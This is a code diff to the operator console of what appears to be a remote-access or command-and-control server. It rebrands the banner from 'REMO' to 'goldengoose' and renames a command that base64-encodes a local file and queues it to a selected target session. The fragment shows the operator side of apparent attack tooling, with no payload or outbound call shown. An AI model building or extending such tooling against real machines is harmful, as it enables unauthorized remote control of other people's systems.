@@ -92,7 +92,7 @@ def user_interface():
     global session_queues
     
     while True:
-        display_block  = "\n[ === === === REMO === === === ]\n"
+        display_block  = "\n[ === === === GOGO === === === ]\n"
         if selected_session != '0':
             display_block += "[  bg|background, " + ', '.join(session_commands[selected_session]) + "\n"
             display_block += "[ Queued for target:\n"
@@ -126,23 +126,21 @@ def user_interface():
             pass
         # Valid command to send to target
         elif command.split()[0].strip() in session_commands[selected_session]:
-            if command.startswith("load"):
+            if command.startswith("gogo"):
                 file = command.split()[-1]
                 with open(file, "rb") as f:
                     data = f.read()
-                command = "load " + base64.b64encode(data).decode()
+                command = "gogo " + base64.b64encode(data).decode()
             session_queues[selected_session].put(command)
             print(f'Queued data for session {selected_session}.')
 
 
 if __name__ == "__main__":
-    print(""" _______    ________ ____    ____   ___    
-|_   __ \  |_   __  |_   \  /   _|.'   `.  
-  | |__) |   | |_ \_| |   \/   | /  .-.  \ 
-  |  __ /    |  _| _  | |\  /| | | |   | | 
- _| |  \ \_ _| |__/ |_| |_\/_| |_\  `-'  / 
-|____| |___|________|_____||_____|`.___.'  
-                                           """)
+    print("""               __    __                                   
+  ___ _ ___   / /___/ /___  ___  ___ _ ___  ___   ___ ___ 
+ / _ `// _ \ / // _  // -_)/ _ \/ _ `// _ \/ _ \ (_-</ -_)
+ \_, / \___//_/ \_,_/ \__//_//_/\_, / \___/\___//___/\__/ 
+/___/                          /___/                      """)
     server_thread = threading.Thread(target=run_server)
     server_thread.daemon = True
     server_thread.start()
